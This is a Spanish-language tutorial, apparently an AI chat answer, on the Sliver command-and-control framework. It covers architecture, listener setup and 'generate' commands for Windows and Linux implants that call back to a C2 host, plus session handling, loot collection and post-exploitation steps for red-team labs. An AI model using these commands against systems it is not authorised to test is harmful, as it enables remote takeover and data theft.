
Sliver es un **C2 Framework (Command & Control)** desarrollado por [BishopFox](https://github.com/BishopFox/sliver?utm_source=chatgpt.com), usado en **red teaming y pentesting avanzado**.  
Un _C2_ es básicamente el “cerebro” de la operación:

- Permite crear **implants (payloads)** que se ejecutan en las máquinas objetivo.
    
- Esos implants se conectan de regreso al servidor C2.
    
- Desde la consola del C2, el atacante controla la máquina víctima (ejecutar comandos, cargar módulos, moverse lateralmente, etc.).
    

---

## 🔹 ¿Por qué Sliver?

Comparado con otros C2 (como Metasploit, Covenant o Cobalt Strike), Sliver tiene ventajas clave:

- **Open Source y gratuito** (Cobalt Strike es de pago y muy caro).
    
- **Cross-platform implants**: genera payloads para Windows, Linux y macOS.
    
- **Múltiples protocolos de comunicación**: HTTP, HTTPS, mTLS, DNS, WireGuard (!).
    
- **Soporta OpSec avanzado**: técnicas de evasión, fileless, inyección, etc.
    
- **Plugins / extensiones**: puedes expandirlo con tus propios módulos.
    

---

## 🔹 Arquitectura básica

Imagina esto como un **mapa de guerra**:

1. **Servidor C2 (Sliver server)**
    
    - Es tu máquina atacante (ej. Debian 12 o Kali).
        
    - Controla toda la operación.
        
2. **Operador (Sliver client)**
    
    - Interfaz desde donde tú trabajas.
        
    - Se conecta al servidor.
        
3. **Implants (payloads)**
    
    - Programas maliciosos generados por Sliver.
        
    - Se ejecutan en la víctima y abren comunicación con tu C2.
        
4. **Canales de comunicación (transports)**
    
    - HTTP/HTTPS → más común, se camufla en tráfico web.
        
    - mTLS → tráfico cifrado mutuo.
        
    - DNS → útil para evadir firewalls.
        
    - WireGuard → canal directo, muy difícil de detectar.
        

---

## 🔹 Ciclo de uso en un pentest

1. **Montas el servidor Sliver** en tu VPS / laboratorio.
    
2. **Creas un implant** (ej. `exe`, `dll`, `elf`, `mach-o`).
    
3. **Entregas el implant** a la víctima (phishing, exploit, dropper, etc.).
    
4. La víctima **se conecta al C2** (tienes un _session_).
    
5. Desde la consola, **ejecutas comandos**:
    
    - Reconocimiento interno.
        
    - Movimiento lateral.
        
    - Evasión de defensas.
        
    - Exfiltración de datos.
        

---

Vamos a hacer algo **profundo y completo**, para que tengas **el 100% del contexto de Sliver**, basado en la versión actual y todos los comandos que me pasaste. Te voy a dar:

1. **Visión general de Sliver y su arquitectura**
    
2. **Tipos de listeners y cómo funcionan**
    
3. **Payloads/implants y generación**
    
4. **Gestión de listeners (jobs) y sesiones**
    
5. **Post-explotación: beacons, hosts, loot, reacciones automáticas**
    
6. **Flujo completo de laboratorio**, con notas y tips de seguridad y pruebas
    

---

# 🔹 0. Qué es Sliver

Sliver es un **framework C2 (Command & Control) multiplataforma** usado para **hacking ético y red team**, capaz de:

- Ejecutar **implants en Windows, Linux, macOS**
    
- Soportar múltiples **protocolos de C2**: mTLS, HTTPS, HTTP, WireGuard, DNS, Named Pipe
    
- Administrar **listeners y sesiones** desde un solo servidor
    
- Gestionar **beacons** y **automatización de reacciones**
    

Sliver tiene tres capas principales:

1. **Servidor (Sliver Server / C2)** → levanta listeners, genera implants, gestiona sesiones y jobs.
    
2. **Implants / Payloads** → binarios que se ejecutan en la víctima y se conectan al C2.
    
3. **Cliente / Interfaz** → línea de comandos para interactuar con sesiones, beacons, loot, hosts, etc.
    

---

# 🔹 1. Listeners (Network)

Sliver permite escuchar conexiones de implants mediante **diferentes protocolos**, cada uno con sus flags específicos:

|Listener|Uso principal|Flags clave|
|---|---|---|
|**mtls**|Comunicación segura mutua TLS|`-L` host, `-l` puerto|
|**http**|Tráfico HTTP normal|`-L`, `-l`, `-d` dominio, `-w` website, `-D` deshabilitar OTP|
|**https**|HTTP cifrado TLS|`-L`, `-l`, `-c` cert, `-k` key, `-e` lets-encrypt|
|**wg**|WireGuard VPN para transporte C2|`-L`, `-l` puerto|
|**stage-listener**|Listener para stagers grandes/multiplaforma|flags internos|
|**socks5**|Proxy interno para pivoting|flags internos|
|**websites**|Servir contenido estático|flags internos|
|**wg-config**|Generar archivo cliente WireGuard|flags internos|

**Ejemplo de mTLS:**

`mtls -L 192.168.1.10 -l 9443 jobs`

**Ejemplo de HTTPS con LetsEncrypt:**

`https -L 192.168.1.10 -l 443 -e -w mysite jobs`

---

# 🔹 2. Payloads / Implants

**Comando principal:** `generate`

- Genera binarios o shellcode para **Windows, Linux, macOS**
    
- Puede conectarse a múltiples C2 simultáneamente (`--mtls`, `--http`, `--dns`, `--wg`)
    
- Soporta **evasion y limits** (usuario, hostname, dominio, archivos, locale, datetime)
    

**Ejemplos:**

**Windows mTLS**

`generate --os windows --mtls 192.168.1.10:9443 --s win_mtls.exe`

**Linux stack C2**

`generate --os linux --mtls mtls.example.com --http http.example.com --dns dns.example.com --s implant`

**WireGuard**

`generate --os linux --wg 192.168.1.10:51820 --key-exchange 1337 --tcp-comms 8888 --s implant`

**Opciones clave:**

- `--canary` → dominios canarios únicos
    
- `--limit-*` → limitar ejecución a hosts, usuario, locale, etc.
    
- `--format` → exe, shared, service, shellcode
    
- `--traffic-encoders` → cifrado opcional de tráfico
    

---

# 🔹 3. Gestión de listeners y sesiones

**Listeners (Jobs)**

`jobs          # lista todos los listeners jobs -k 2     # matar listener con ID 2 jobs -K       # matar todos los listeners`

**Sesiones (Implants conectados)**

`sessions              # lista sesiones sessions -i 1         # interactuar con sesión 1 sessions -k 1         # eliminar sesión 1 sessions -K           # eliminar todas sessions -C           # limpiar sesiones DEAD sessions prune        # eliminar sesiones obsoletas`

**Filtros de sesiones:**

`sessions -f win10      # substring sessions -e "regex"    # regex`

---

# 🔹 4. Post-Explotación

Sliver permite interactuar y recolectar info con:

|Comando|Función|
|---|---|
|`beacons`|Gestión de beacons para automatización|
|`hosts`|Base de datos de hosts comprometidos|
|`loot`|Recolectar y administrar archivos y datos de víctimas|
|`reaction`|Automatizar respuestas a eventos|
|`monitor`|Monitor de inteligencia para implantes Sliver|
|`info`|Info detallada de una sesión|

**Flujos comunes:**

1. Ejecutar implant → `sessions` → `use`
    
2. Listar beacons → automatizar tareas → `taskmany`
    
3. Descargar loot → `loot`
    
4. Reacción automática → `reaction`
    

---

# 🔹 5. Flujo completo de laboratorio

1. **Levantar listener**
    

`mtls -L 192.168.1.10 -l 9443`

2. **Generar implant**
    

`generate --os windows --mtls 192.168.1.10:9443 --s win_mtls.exe`

3. **Ejecutar implant en víctima**
    
4. **Verificar sesión**
    

`sessions`

5. **Interactuar con la sesión**
    

`sessions -i 1 whoami pwd`

6. **Recolección post-explotación**
    

`loot list beacons hosts reaction list`

7. **Cerrar sesión y listener**
    

`sessions -k 1 jobs -k 2`

8. **Limpiar todo para reiniciar**
    

`clean`

---

# 🔹 6. Tips de laboratorio y pruebas

- **Siempre verifica listeners y sesiones activas** antes de generar implants
    
- **Usa dominios canarios** (`--canary`) para pruebas seguras
    
- **Cuidado con puertos y firewall**: mTLS, HTTPS, WireGuard necesitan abrir puertos en laboratorio
    
- **Guardar configuración de perfiles** (`profiles`) para reutilizar flags de `generate`
    

---

Con esto tienes **el 100% del contexto de Sliver**, actualizado a la versión actual, con todos los listeners, flags, sesiones, implants y post-explotación. 🔥